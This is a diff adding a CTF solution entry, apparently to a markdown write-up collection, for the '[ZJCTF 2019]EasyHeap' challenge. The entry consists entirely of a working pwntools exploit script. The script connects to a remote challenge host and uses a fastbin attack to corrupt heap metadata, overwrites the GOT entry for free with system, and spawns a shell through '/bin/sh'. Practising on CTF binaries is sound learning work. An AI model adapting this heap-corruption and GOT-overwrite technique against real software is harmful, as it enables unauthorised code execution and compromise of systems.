@@ -875,4 +875,43 @@ icon: icon-html
   r.interactive()
   ```
 
+* ### [ZJCTF 2019]EasyHeap
+
+  ```python
+  from pwn import *
+  r = remote('node2.buuoj.cn.wetolink.com',28300)
+  #r = process('./easyheap')
+  #context.log_level = 'debug'
+  elf = ELF('./easyheap')
+  
+  def create(size,content):
+  	r.sendlineafter('Your choice :','1')
+  	r.sendlineafter('Size of Heap :',str(size))
+  	r.sendlineafter('Content of heap:',content)
+  
+  def edit(idx,size,content):
+  	r.sendlineafter('Your choice :','2')
+  	r.sendlineafter('Index :',str(idx))
+  	r.sendlineafter('Size of Heap :',str(size))
+  	r.sendlineafter('Content of heap :',content)
+  
+  def free(idx):
+  	r.sendlineafter('Your choice :','3')
+  	r.sendlineafter('Index :',str(idx))
+  
+  create(0x60,'fuck')
+  create(0x60,'fuck')
+  create(0x60,'fuck')
+  free(2)
+  fuck_addr = 0x6020b0-3
+  edit(1,0x100,p64(0)*13+p64(0x71)+p64(fuck_addr))
+  create(0x60,'fuck')
+  create(0x60,'aaa'+p64(0)*6+p64(elf.got['free']))
+  edit(2,0x100,p64(elf.plt['system']))
+  create(0x50,'/bin/sh\x00')
+  free(0)
+  r.interactive()
+  
+  ```
+
   
